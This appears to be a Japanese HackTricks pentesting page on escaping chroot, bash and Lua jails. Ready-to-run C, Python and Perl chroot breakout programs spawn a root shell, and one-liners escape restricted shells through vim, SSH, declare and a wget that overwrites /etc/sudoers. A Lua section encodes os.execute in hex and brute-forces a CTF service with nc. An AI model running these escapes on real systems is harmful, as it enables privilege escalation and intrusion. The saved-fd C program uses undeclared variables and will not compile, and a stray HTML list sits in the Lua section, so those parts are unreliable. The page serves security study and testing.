# 制限された環境からの脱出

{% hint style="success" %}
AWSハッキングの学習と練習:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングの学習と練習: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksのサポート</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **HackTricks**と**HackTricks Cloud**のgithubリポジトリにPRを提出して**ハッキングテクニックを共有**してください。

</details>
{% endhint %}

## **GTFOBins**

**"Shell"プロパティを持つバイナリを実行できるかどうかを調べる** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **で検索**

## Chrootの脱出

[wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations)から: chrootメカニズムは、特権を持つ（root）ユーザーによる意図的な改ざんに対抗するためには**意図されていません**。ほとんどのシステムでは、chrootコンテキストは適切にスタックされず、特権を持つchrootedプログラムは**2番目のchrootを実行して脱出する**ことができます。\
通常、これは脱出するためにchroot内でrootである必要があることを意味します。

{% hint style="success" %}
**ツール** [**chw00t**](https://github.com/earthquake/chw00t) は、以下のシナリオを悪用して`chroot`から脱出するために作成されました。
{% endhint %}

### Root + CWD

{% hint style="warning" %}
chroot内で**root**である場合、**別のchroot**を作成して**脱出**することができます。これはLinuxでは2つのchrootが同居できないためです。つまり、新しいフォルダを作成し、その新しいフォルダで**新しいchroot**を作成すると、**新しいchrootの外側**になり、その結果、FS内にいることになります。

通常、chrootは作業ディレクトリを指定されたディレクトリに移動させないため、chrootを作成できますが、その外側にいることができます。
{% endhint %}

通常、chrootジェイル内には`chroot`バイナリが見つからない場合がありますが、バイナリをコンパイル、アップロード、実行することができます:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### ルート + 保存されたfd

{% hint style="warning" %}
これは前のケースと似ていますが、この場合、**攻撃者は現在のディレクトリへのファイルディスクリプタを保存**し、その後**新しいフォルダ内でchrootを作成**します。最後に、彼はchrootの外でその**FDにアクセス**できるため、それにアクセスして**脱出**します。
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

{% hint style="warning" %}
FDはUnixドメインソケットを介して渡すことができるので:

* 子プロセスを作成（fork）
* 親と子が通信できるようにUDSを作成
* 子プロセスで異なるフォルダにchrootを実行
* 親プロセスで、新しい子プロセスのchrootの外にあるフォルダのFDを作成
* UDSを使用してそのFDを子プロセスに渡す
* 子プロセスはそのFDにchdirし、chrootの外にあるため、牢獄から脱出します
{% endhint %}

### Root + Mount

{% hint style="warning" %}
* ルートデバイス（/）をchroot内のディレクトリにマウント
* そのディレクトリにchroot
これはLinuxで可能です
{% endhint %}

### Root + /proc

{% hint style="warning" %}
* procfsをchroot内のディレクトリにマウント（まだマウントされていない場合）
* /proc/1/rootのように異なるルート/cwdエントリを持つpidを探す
* そのエントリにchroot
{% endhint %}

### Root(?) + Fork

{% hint style="warning" %}
* フォーク（子プロセス）を作成し、FS内の異なるフォルダにchrootし、そのフォルダにCDします
* 親プロセスから、子プロセスがいるフォルダを、子プロセスのchrootの前のフォルダに移動します
* この子プロセスは、chrootの外にいることに気づくでしょう
{% endhint %}

### ptrace

{% hint style="warning" %}
* 以前はユーザーが自分自身のプロセスを自分自身のプロセスからデバッグできましたが、これはデフォルトではもはや可能ではありません
* とにかく、可能であれば、プロセスにptraceしてその中でシェルコードを実行できます（[この例を参照](linux-capabilities.md#cap\_sys\_ptrace)）。
{% endhint %}

## Bash Jails

### Enumeration

牢獄に関する情報を取得します:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### PATHの変更

PATH環境変数を変更できるかどうかを確認します
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### vimの使用
```bash
:set shell=/bin/sh
:shell
```
### スクリプトの作成

_/bin/bash_ を内容とする実行可能ファイルを作成できるかどうかを確認します。
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### SSH経由でbashを取得

SSH経由でアクセスしている場合、次のトリックを使用してbashシェルを実行できます：
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### 宣言
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

例えばsudoersファイルを上書きすることができます。
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### その他のトリック

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io)\
**興味深いページも次のとおりです:**

{% content-ref url="../bypass-bash-restrictions/" %}
[bypass-bash-restrictions](../bypass-bash-restrictions/)
{% endcontent-ref %}

## Python Jails

Pythonジェイルからの脱出に関するトリックは、次のページにあります:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Lua Jails

このページでは、Lua内でアクセス可能なグローバル関数を見つけることができます: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**コマンド実行付きのEval:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
いくつかのトリックを**ドットを使用せずにライブラリの関数を呼び出す方法**：
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
列挙されたライブラリの機能：

```html
<ol>
<li>関数1</li>
<li>関数2</li>
<li>関数3</li>
</ol>
```
```bash
for k,v in pairs(string) do print(k,v) end
```
注意してください。**異なるLua環境で前のワンライナーを実行するたびに、関数の順序が変わります**。したがって、特定の関数を実行する必要がある場合は、異なるLua環境をロードしてleライブラリの最初の関数を呼び出すブルートフォース攻撃を実行できます：
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**インタラクティブなluaシェルを取得する**: もし制限されたluaシェル内にいる場合、以下を呼び出すことで新しいluaシェル（そして恐らく制限のないもの）を取得できます。
```bash
debug.debug()
```
## 参考文献

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (スライド: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

{% hint style="success" %}
AWSハッキングの学習と練習:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングの学習と練習: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksのサポート</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **HackTricks**と**HackTricks Cloud**のGitHubリポジトリにPRを提出して、ハッキングトリックを共有してください。

</details>
{% endhint %}
